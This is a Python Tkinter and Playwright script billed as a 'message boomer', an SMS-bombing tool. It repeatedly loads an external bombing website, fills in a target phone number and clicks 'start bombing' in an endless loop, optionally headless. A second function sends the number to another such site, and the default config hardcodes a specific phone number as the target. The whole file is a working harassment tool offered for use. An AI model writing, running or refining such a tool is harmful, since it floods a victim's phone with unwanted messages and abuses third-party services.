# !/user/bin/env pyhton解释器路径
# -*-coding:utf-8-*- 脚本编码
import os,time,tkinter,threading,requests
from configparser import ConfigParser
from tkinter import *
import tkinter.messagebox
from tkinter.ttk import Progressbar
from playwright.sync_api import Playwright, sync_playwright
file100 = 'configmsg.ini'


def file1(fcode):  # 文件读写
    cf = ConfigParser()
    if fcode==0:
        if os.path.exists(file100):  # 文件存在检测
            cf.read(file100)
            phone = cf.get("main", "uid")
            secondsw = cf.get("main", "tim")
            testurl = cf.get("main", "url")
            mode = cf.get("main","mode")
            return phone,secondsw,testurl,mode
        else:
            #创建新配置文件
            phone = 13902326164
            secondsw =300
            testurl = "https://www.privacys.club/message/index.php?"
            answer = search('chrome.exe')
            if answer == -1:
                mode = 0
            else:
                mode = 1
            with open(file100, "w") as file:
                file.write('[main]'+'\n'+'uid = '+str(phone)+
                           '\n'+'tim = '+str(secondsw)+
                           '\n'+'mode = '+str(mode)+
                           '\n'+'url = '+str(testurl))  # 文件写入
                file.close()
            return phone, secondsw, testurl, mode

    else:#文件修改
        cf.read(file100)
        phone=text1.get()
        secondsw=text2.get()
        testurl = cf.get("main", "url")
        mode = cf.get("main", "mode")
        cf['main']['uid'] = phone
        cf['main']['tim'] =secondsw
        fo = open(file100, 'w')  # 重新创建配置文件
        cf.write(fo)  # 数据写入配置文件
        fo.close()
        return phone, secondsw, testurl, mode

def search(name):
    path = 'c:\\'
    for root, dirs, files in os.walk(path):  # path 为根目录
        if name in dirs or name in files:
            flag = 1  # 判断是否找到文件
            root = str(root)+ str('\chrome.exe')
            return root
    return -1

def run(playwright: Playwright,codeq) -> None:
    result1 =file1(1)#保存
    #result1 = file1(0)
    num1 = result1[0]
    times= result1[1]
    url1 = result1[2]
    mode = result1[3]
    os.system('mode con cols=20 lines=20')
    show()
    if codeq == 0:
        a00 = False
    else:
        a00 = True

    if mode == '1':
        mode = 'chrome'
    else:
        mode = None

    while True:
        bar['value'] = 0
        browser = playwright.chromium.launch(headless=a00,channel=mode)
        context = browser.new_context()  # Open new page
        page = context.new_page()
        page.goto(url1)
        page.fill("[placeholder=\"输入手机号码\"]", num1)
        page.click("text=启动轰炸")
        time.sleep(int(times)) # sec
        context.close()
        time.sleep(1)
        browser.close()
        bar['value'] = 48

def req():

    result1 = file1(1)  # 保存
    num1 = result1[0]
    url1 = 'https: // www.ceya.me / index.php?hm =' +num1 + '& ok ='
    mode = result1[3]
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/100.0.4896.60 Safari/537.36'
    }

    response = requests.get(url=url1, headers=headers)  # 发起请求#get会返回一个响应对象
    response.encoding = "gbk"
    print(response.status_code)

def show():
    bar['value'] = 0
    bar['max'] = 98
    while bar['value'] <= bar['max']:
        bar.step(3)
        root.update()
        time.sleep(0.005)
        #if bar['value'] == bar['max']:
    bar['value'] = 0
        #if stop_threads: #精髓在这里，这算是最直接的方法了，我也用的这个方法
            #break

def thread_it(func, *args):
    '''将函数打包进线程'''
    # 创建
    t = threading.Thread(target=func, args=args)
    # 守护 !!!
    t.setDaemon(True)
    # 启动
    t.start()
    # 阻塞--卡死界面！
    #t.join()


def start1():
    with sync_playwright() as playwright:
        run(playwright,0)
    tkinter.messagebox.showinfo('完成','结束')
def start2():
    with sync_playwright() as playwright:
        run(playwright,1)
    tkinter.messagebox.showinfo('完成','结束')

def gui():#gui布局
    root.title("MSG")
    root.wm_attributes('-topmost', 1)
    label=tkinter.Label(root,text='message boomer -CN')  #生成标签
    label2=tkinter.Label(root,text='TEL +86')
    label3=tkinter.Label(root,text='s')
    button1=tkinter.Button(root,text='start',width=8,command=lambda :thread_it(start1)) #生成button1
    button2=tkinter.Button(root,text='headless',width=8,command=lambda :thread_it(start2))
    button3=tkinter.Button(root,text='notice',width=8,command=notice)
     #数据
    text1.insert(0,file1(0)[0])
    text2.insert(0,file1(0)[1])
    #gui布局
    label.grid(row=0, column=0)
    label2.grid(row=1,sticky=W)
    text1.grid(row=1,column=0)
    text2.grid(row=1,sticky=E,padx=12)
    label3.grid(row=1,sticky=E)
    bar.grid(row=2)
    button1.grid(row=3,sticky=W)
    button2.grid(row=3)
    button3.grid(row=3,sticky=E)

def notice():
    t0='\n'
    t1='若配置文件不存在则自动生成'
    t2='本品可自动检测chrome是否安装'
    t3='powered by louis16s'
    t4='visit me at www.louis16s.top'
    tkinter.messagebox.showinfo('说明',t0+t1+t0+t2+t0+t3+t0+t4)
if __name__ == '__main__':
    root=tkinter.Tk()  #生成root主窗口
    text1=tkinter.Entry(root,width=11,background='#FFFF00')
    text2=tkinter.Entry(root,width=4,background='#afeeee')
    bar = tkinter.ttk.Progressbar(root, length=200, mode='indeterminate', orient=tkinter.HORIZONTAL)
    #函数
    thread_it(gui())
    root.mainloop()
